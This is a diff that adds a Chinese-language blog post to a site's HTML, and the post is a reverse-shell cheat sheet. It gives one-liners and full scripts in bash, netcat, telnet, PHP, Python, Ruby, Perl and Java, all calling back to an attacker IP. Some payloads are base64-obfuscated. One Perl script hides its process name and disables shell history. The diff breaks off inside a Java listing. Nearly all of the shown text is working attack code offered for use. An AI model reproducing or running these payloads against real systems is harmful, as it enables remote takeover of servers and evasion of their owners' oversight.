@@ -333,6 +333,214 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/12/09/反弹Shell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Introspelliam">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/me.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="上善若水">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/12/09/反弹Shell/" itemprop="url">反弹Shell</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-09T23:53:55+08:00">
+                2017-12-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>假设攻击端为10.0.0.1，接收端口为8080</p>
+<p>服务器端为10.0.0.2</p>
+<h3 id="1、Bash"><a href="#1、Bash" class="headerlink" title="1、Bash"></a>1、Bash</h3><p>关于bash中的重定向知识，可以参考<a href="/2018/04/10/shell之后的操作/">shell之后的操作</a></p>
+<p>服务器端：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash -c &apos;sh -i &amp;&gt;/dev/tcp/10.0.0.1/8080 0&gt;&amp;1&apos;</div></pre></td></tr></table></figure>
+<p>攻击端：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -lvvp 8080</div></pre></td></tr></table></figure>
+<h3 id="2、NetCat"><a href="#2、NetCat" class="headerlink" title="2、NetCat"></a>2、NetCat</h3><p>服务器端</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc -e /bin/sh 10.0.0.1 8080</div><div class="line">nc -e /bin/sh 10.0.0.1 8080</div></pre></td></tr></table></figure>
+<p>现在的很多/bin/nc -&gt; /etc/alternatives/nc -&gt; /bin/nc.openbsd</p>
+<p>但是实际上这个nc.openbsd不支持nc -e命令</p>
+<p>所以我们最好使用的是/bin/nc.traditional</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/bin/nc.traditional -e /bin/sh 10.0.0.1 8080</div></pre></td></tr></table></figure>
+<p>当然若没有/bin/nc.traditional这个nc传统版，我们也可以使用下面的方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 8080 &gt;/tmp/f</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">本地监听两个端口,通过管道,一处输入,一处输出</div><div class="line">nc 10.0.0.1 2333|/bin/sh|nc 10.0.0.1 2444</div></pre></td></tr></table></figure>
+<p><img src="/images/2017-12-10/43-300x71.png" alt="img"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mknod /tmp/backpipe p &amp;&amp; /bin/sh 0&lt;/tmp/backpipe | nc 10.0.0.1 8080 1&gt;/tmp/backpipe</div></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">将nc替换成telnet</div><div class="line">mknod backpipe p &amp;&amp; telnet 10.0.0.1 8080 0&lt;backpipe | /bin/bash 1&gt;backpipe</div></pre></td></tr></table></figure>
+<h3 id="3、PHP"><a href="#3、PHP" class="headerlink" title="3、PHP"></a>3、PHP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php -r &apos;$sock=fsockopen(&quot;10.0.0.1&quot;,8080);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</div></pre></td></tr></table></figure>
+<p>不知道怎么回事，这个反弹的shell并不能用。代码假设TCP连接的文件描述符为3，如果不行可以试下4,5,6。当然推荐使用下面的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php -r &apos;set_time_limit(0);$a=&quot;1.0&quot;;$b=&quot;10.0.0.1&quot;;$c=8080;$d=1400;$e=null;$f=null;$g=&quot;uname -a; w; id; /bin/sh -i&quot;;$h=0;$i=0;if(function_exists(&quot;pcntl_fork&quot;))&#123;$j=pcntl_fork();if($j==-1)&#123;printit(&quot;ERROR: Can not fork&quot;);exit(1);&#125;if($j)&#123;exit(0);&#125;if(posix_setsid()==-1)&#123;printit(&quot;Error: Can not setsid()&quot;);exit(1);&#125;$h=1;&#125;else&#123;printit(&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;);&#125;chdir(&quot;/&quot;);umask(0);$k=fsockopen($b,$c,$l,$m,30);if(!$k)&#123;printit(&quot;$m ($l)&quot;);exit(1);&#125;$n=array(0=&gt;array(&quot;pipe&quot;,&quot;r&quot;),1=&gt;array(&quot;pipe&quot;,&quot;w&quot;),2=&gt;array(&quot;pipe&quot;,&quot;w&quot;));$o=proc_open($g,$n,$p);if(!is_resource($o))&#123;printit(&quot;ERROR: Can not spawn shell&quot;);exit(1);&#125;stream_set_blocking($p[0],0);stream_set_blocking($p[1],0);stream_set_blocking($p[2],0);stream_set_blocking($k,0);printit(&quot;Successfully opened reverse shell to $b:$c&quot;);while(1)&#123;if(feof($k))&#123;printit(&quot;ERROR: Shell connection terminated&quot;);break;&#125;if(feof($p[1]))&#123;printit(&quot;ERROR: Shell process terminated&quot;);break;&#125;$q=array($k,$p[1],$p[2]);$r=stream_select($q,$e,$f,null);if(in_array($k,$q))&#123;if($i)printit(&quot;SOCK READ&quot;);$s=fread($k,$d);if($i)printit(&quot;SOCK: $s&quot;);fwrite($p[0],$s);&#125;if(in_array($p[1],$q))&#123;if($i)printit(&quot;STDOUT READ&quot;);$s=fread($p[1],$d);if($i)printit(&quot;STDOUT: $s&quot;);fwrite($k,$s);&#125;if(in_array($p[2],$q))&#123;if($i)printit(&quot;STDERR READ&quot;);$s=fread($p[2],$d);if($i)printit(&quot;STDERR: $s&quot;);fwrite($k,$s);&#125;&#125;fclose($k);fclose($p[0]);fclose($p[1]);fclose($p[2]);proc_close($o);function printit($t)&#123;if(!$h)&#123;print&quot;$t\n&quot;;&#125;&#125;&apos;</div></pre></td></tr></table></figure>
+<p>或者</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php -r &apos;function which($a)&#123;$b=execute(&quot;which $a&quot;);return($b?$b:$a);&#125;function execute($c)&#123;$d=&quot;&quot;;if($c)&#123;if(function_exists(&quot;exec&quot;))&#123;@exec($c,$d);$d=join(&quot;\n&quot;,$d);&#125;elseif(function_exists(&quot;shell_exec&quot;))&#123;$d=@shell_exec($c);&#125;elseif(function_exists(&quot;system&quot;))&#123;@ob_start();@system($c);$d=@ob_get_contents();@ob_end_clean();&#125;elseif(function_exists(&quot;passthru&quot;))&#123;@ob_start();@passthru($c);$d=@ob_get_contents();@ob_end_clean();&#125;elseif(@is_resource($e=@popen($c,&quot;r&quot;)))&#123;$d=&quot;&quot;;while(!@feof($e))&#123;$d.=@fread($e,1024);&#125;@pclose($e);&#125;&#125;return $d;&#125;function cf($g,$h)&#123;if($i=@fopen($g,&quot;w&quot;))&#123;@fputs($i,@base64_decode($h));@fclose($i);&#125;&#125;$j=&quot;10.0.0.1&quot;;$k=&quot;8080&quot;;$l=array(&quot;perl&quot;=&gt;&quot;perl&quot;,&quot;c&quot;=&gt;&quot;c&quot;);$m=&quot;IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj&quot;.&quot;aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR&quot;.&quot;hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT&quot;.&quot;sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI&quot;.&quot;kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi&quot;.&quot;KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl&quot;.&quot;OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==&quot;;cf(&quot;/tmp/.bc&quot;,$m);$d=execute(which(&quot;perl&quot;).&quot; /tmp/.bc $j $k &amp;&quot;);&apos;</div></pre></td></tr></table></figure>
+<h3 id="4、Python"><a href="#4、Python" class="headerlink" title="4、Python"></a>4、Python</h3><p>以python2.7为例</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c &quot;exec(\&quot;import socket, subprocess;s =socket.socket();s.connect((&apos;10.0.0.1&apos;,8080))\nwhile 1: proc =subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">若将</div><div class="line">import socket,subprocess,os</div><div class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</div><div class="line">s.connect((&quot;10.0.0.1&quot;,8080))</div><div class="line">os.dup2(s.fileno(),0)</div><div class="line">os.dup2(s.fileno(),1)</div><div class="line">os.dup2(s.fileno(),2)</div><div class="line">p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);</div><div class="line">base64加密后生成另外的shell</div><div class="line"></div><div class="line">python -c &apos;import base64;exec(base64.b64decode(&quot;aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsMSkKcy5jb25uZWN0KCgnMTAuMC4wLjEnLDgwODApKQpsPXN0cnVjdC51bnBhY2soJz5JJyxzLnJlY3YoNCkpWzBdCmQ9cy5yZWN2KDQwOTYpCndoaWxlIGxlbihkKSE9bDoKCWQrPXMucmVjdig0MDk2KQpleGVjKGQseydzJzpzfSkK&quot;))&apos;</div></pre></td></tr></table></figure>
+<h3 id="5、Ruby"><a href="#5、Ruby" class="headerlink" title="5、Ruby"></a>5、Ruby</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ruby -rsocket -e&apos;f=TCPSocket.open(&quot;10.0.0.1&quot;,8080).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;</div></pre></td></tr></table></figure>
+<p>不依赖于/bin/sh的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ruby -rsocket -e &apos;exit if fork;c=TCPSocket.new(&quot;10.0.0.1&quot;,&quot;8080&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&apos;</div></pre></td></tr></table></figure>
+<p>windows环境下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ruby -rsocket -e &apos;c=TCPSocket.new(&quot;10.0.0.1&quot;,&quot;8080&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&apos;</div></pre></td></tr></table></figure>
+<p>MSF中的相应的反弹shell代码</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env ruby</span></div><div class="line"></div><div class="line"><span class="keyword">require</span> <span class="string">'socket'</span></div><div class="line"><span class="keyword">require</span> <span class="string">'open3'</span></div><div class="line"></div><div class="line"><span class="comment">#Set the Remote Host IP</span></div><div class="line">RHOST = <span class="string">"192.168.1.10"</span> </div><div class="line"><span class="comment">#Set the Remote Host Port</span></div><div class="line">PORT = <span class="string">"6667"</span></div><div class="line"></div><div class="line"><span class="comment">#Tries to connect every 20 sec until it connects.</span></div><div class="line"><span class="keyword">begin</span></div><div class="line">sock = TCPSocket.new <span class="string">"<span class="subst">#&#123;RHOST&#125;</span>"</span>, <span class="string">"<span class="subst">#&#123;PORT&#125;</span>"</span></div><div class="line">sock.puts <span class="string">"We are connected!"</span></div><div class="line"><span class="keyword">rescue</span></div><div class="line">  sleep <span class="number">20</span></div><div class="line">  <span class="keyword">retry</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="comment">#Runs the commands you type and sends you back the stdout and stderr.</span></div><div class="line"><span class="keyword">begin</span></div><div class="line">  <span class="keyword">while</span> line = sock.gets</div><div class="line">    Open3.popen2e(<span class="string">"<span class="subst">#&#123;line&#125;</span>"</span>) <span class="keyword">do</span> <span class="params">| stdin, stdout_and_stderr |</span></div><div class="line">              IO.copy_stream(stdout_and_stderr, sock)</div><div class="line">              <span class="keyword">end</span>  </div><div class="line">  <span class="keyword">end</span></div><div class="line"><span class="keyword">rescue</span></div><div class="line">  <span class="keyword">retry</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure>
+<h3 id="6、Perl"><a href="#6、Perl" class="headerlink" title="6、Perl"></a>6、Perl</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;</div></pre></td></tr></table></figure>
+<p>一个不依赖调用/bin/bash的方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -MIO -e &apos;use IO::Socket;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;10.0.0.1:8080&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&apos;</div></pre></td></tr></table></figure>
+<p>完整的perl反弹shell脚本</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/perl -w</span></div><div class="line"><span class="comment"># perl-reverse-shell - A Reverse Shell implementation in PERL</span></div><div class="line"><span class="keyword">use</span> strict;</div><div class="line"><span class="keyword">use</span> Socket;</div><div class="line"><span class="keyword">use</span> FileHandle;</div><div class="line"><span class="keyword">use</span> POSIX;</div><div class="line"><span class="keyword">my</span> $VERSION = <span class="string">"1.0"</span>;</div><div class="line"><span class="comment"># Where to send the reverse shell. Change these.</span></div><div class="line"><span class="keyword">my</span> $ip = <span class="string">'x.x.x.x'</span>;</div><div class="line"><span class="keyword">my</span> $port = <span class="number">2333</span>;</div><div class="line"><span class="comment"># Options</span></div><div class="line"><span class="keyword">my</span> $daemon = <span class="number">1</span>;</div><div class="line"><span class="keyword">my</span> $auth = <span class="number">0</span>; <span class="comment"># 0 means authentication is disabled and any</span></div><div class="line"><span class="comment"># source IP can access the reverse shell</span></div><div class="line"><span class="keyword">my</span> $authorised_client_pattern = <span class="string">qr(/^127\.0\.0\.1$/)</span>;</div><div class="line"><span class="comment"># Declarations</span></div><div class="line"><span class="keyword">my</span> $global_page = <span class="string">""</span>;</div><div class="line"><span class="keyword">my</span> $fake_process_name = <span class="string">"/usr/sbin/apache"</span>;</div><div class="line"><span class="comment"># Change the process name to be less conspicious</span></div><div class="line">$0 = <span class="string">"[httpd]"</span>;</div><div class="line"><span class="comment"># Authenticate based on source IP address if required</span></div><div class="line"><span class="keyword">if</span> (<span class="keyword">defined</span>($ENV&#123;<span class="string">'REMOTE_ADDR'</span>&#125;)) &#123;</div><div class="line">    cgiprint(<span class="string">"Browser IP address appears to be: $ENV&#123;'REMOTE_ADDR'&#125;"</span>);</div><div class="line">    <span class="keyword">if</span> ($auth) &#123;</div><div class="line">        <span class="keyword">unless</span> ($ENV&#123;<span class="string">'REMOTE_ADDR'</span>&#125; =~ $authorised_client_pattern) &#123;</div><div class="line">        cgiprint(<span class="string">"ERROR: Your client isn't authorised to view this page"</span>);</div><div class="line">        cgiexit();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">&#125; <span class="keyword">elsif</span> ($auth) &#123;</div><div class="line">    cgiprint(<span class="string">"ERROR: Authentication is enabled, but I couldn't determine your IP address. Denying access"</span>);</div><div class="line">    cgiexit(<span class="number">0</span>);</div><div class="line">&#125;</div><div class="line"><span class="comment"># Background and dissociate from parent process if required</span></div><div class="line"><span class="keyword">if</span> ($daemon) &#123;</div><div class="line">    <span class="keyword">my</span> $pid = <span class="keyword">fork</span>();</div><div class="line">    <span class="keyword">if</span> ($pid) &#123;</div><div class="line">        cgiexit(<span class="number">0</span>); <span class="comment"># parent exits</span></div><div class="line">    &#125;</div><div class="line">    setsid();</div><div class="line">    <span class="keyword">chdir</span>(<span class="string">'/'</span>);</div><div class="line">    <span class="keyword">umask</span>(<span class="number">0</span>);</div><div class="line">&#125;</div><div class="line"><span class="comment"># Make TCP connection for reverse shell</span></div><div class="line"><span class="keyword">socket</span>(SOCK, PF_INET, SOCK_STREAM, <span class="keyword">getprotobyname</span>(<span class="string">'tcp'</span>));</div><div class="line"><span class="keyword">if</span> (<span class="keyword">connect</span>(SOCK, sockaddr_in($port,inet_aton($ip)))) &#123;</div><div class="line">    cgiprint(<span class="string">"Sent reverse shell to $ip:$port"</span>);</div><div class="line">    cgiprintpage();</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    cgiprint(<span class="string">"Couldn't open reverse shell to $ip:$port: $!"</span>);</div><div class="line">    cgiexit();</div><div class="line">&#125;</div><div class="line"><span class="comment"># Redirect STDIN, STDOUT and STDERR to the TCP connection</span></div><div class="line"><span class="keyword">open</span>(STDIN, <span class="string">"&gt;&amp;SOCK"</span>);</div><div class="line"><span class="keyword">open</span>(STDOUT,<span class="string">"&gt;&amp;SOCK"</span>);</div><div class="line"><span class="keyword">open</span>(STDERR,<span class="string">"&gt;&amp;SOCK"</span>);</div><div class="line">$ENV&#123;<span class="string">'HISTFILE'</span>&#125; = <span class="string">'/dev/null'</span>;</div><div class="line"><span class="keyword">system</span>(<span class="string">"w;uname -a;id;pwd"</span>);</div><div class="line"><span class="keyword">exec</span>(&#123;<span class="string">"/bin/sh"</span>&#125; ($fake_process_name, <span class="string">"-i"</span>));</div><div class="line"><span class="comment"># Wrapper around print</span></div><div class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiprint</span> </span>&#123;</div><div class="line">    <span class="keyword">my</span> $line = <span class="keyword">shift</span>;</div><div class="line">    $line .= <span class="string">"&amp;lt;p&amp;gt;\n"</span>;</div><div class="line">    $global_page .= $line;</div><div class="line">&#125;</div><div class="line"><span class="comment"># Wrapper around exit</span></div><div class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiexit</span> </span>&#123;</div><div class="line">    cgiprintpage();</div><div class="line">    <span class="keyword">exit</span> <span class="number">0</span>; <span class="comment"># 0 to ensure we don't give a 500 response.</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment"># Form HTTP response using all the messages gathered by cgiprint so far</span></div><div class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiprintpage</span> </span>&#123;</div><div class="line">    <span class="keyword">print</span> <span class="string">"Content-Length: "</span> . <span class="keyword">length</span>($global_page) . <span class="string">"\r</span></div><div class="line">Connection: close\r</div><div class="line">Content-Type: text\/html\r\n\r\n" . $global_page;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e <span class="string">'use strict;use Socket;use FileHandle;use POSIX;my $VERSION = "1.0";my $ip = "10.0.0.1";my $port = 8080;my $daemon = 1;my $auth = 0; my $authorised_client_pattern = qr(/^127\.0\.0\.1$/);my $global_page = "";my $fake_process_name = "/usr/sbin/apache";$0 = "[httpd]";if (defined($ENV&#123;"REMOTE_ADDR"&#125;)) &#123;cgiprint("Browser IP address appears to be: $ENV&#123;'</span>REMOTE_ADDR<span class="string">'&#125;");if ($auth) &#123;unless ($ENV&#123;"REMOTE_ADDR"&#125; =~ $authorised_client_pattern) &#123;cgiprint("ERROR: Your client is not authorised to view this page");cgiexit();&#125;&#125;&#125; elsif ($auth) &#123;cgiprint("ERROR: Authentication is enabled, but I could not determine your IP address. Denying access");cgiexit(0);&#125;if ($daemon) &#123;my $pid = fork();if ($pid) &#123;cgiexit(0);&#125;setsid();chdir("/");umask(0);&#125;socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname("tcp"));if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) &#123;cgiprint("Sent reverse shell to $ip:$port");cgiprintpage();&#125; else &#123;cgiprint("Could not open reverse shell to $ip:$port: $!");cgiexit();&#125;open(STDIN, "&gt;&amp;SOCK");open(STDOUT,"&gt;&amp;SOCK");open(STDERR,"&gt;&amp;SOCK");$ENV&#123;"HISTFILE"&#125; = "/dev/null";system("w;uname -a;id;pwd");exec(&#123;"/bin/sh"&#125; ($fake_process_name, "-i"));sub cgiprint &#123;my $line = shift;$line .= "&lt;p&gt;\n";$global_page .= $line;&#125;sub cgiexit &#123;cgiprintpage();exit 0;&#125;sub cgiprintpage &#123;print "Content-Length: " . length($global_page) . "\r\nConnection: close\r\nContent-Type: text\/html\r\n\r\n" . $global_page;&#125;'</span></div></pre></td></tr></table></figure>
+<h3 id="7、Java"><a href="#7、Java" class="headerlink" title="7、Java"></a>7、Java</h3><p>ReverseShell.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReverseShell</span></span></div><div class="line">&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</div><div class="line">        <span class="keyword">try</span>&#123;</div><div class="line">            Runtime r = Runtime.getRuntime();</div><div class="line">            Process p = r.exec(<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/10.0.0.1/8080;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"</span>&#125;);</div><div class="line">            p.waitFor();</div><div class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</div><div class="line">            e.printStackTrace();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>值得一提的是，由于java并不是脚本式语言，所以并不支持直接运行一行程序！所以需要进行的操作是：</p>
+<blockquote>
+<p>先将上述内容复制到一个文件中，以ReverseShell.java命名(必须是这个名字，类和文件名要一致)；</p>
+<p>然后运行javac ReverseShell.java生成ReverseShell.class字节码文件。（这个操作需要javac，该命令依赖jdk）</p>
+<p>最后执行java ReverseShell（执行过程中不用加后缀，java命令依赖于jre，最好将其放置在后台运行。即加上&amp;或者nohup）</p>
+</blockquote>
+<p>下面提供一个相对较为完整的Applet程序，其应该在网页中运行的，但是为了测试简单，我们直接在其中加入了main函数，所以有点像一个单独的程序一样。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div 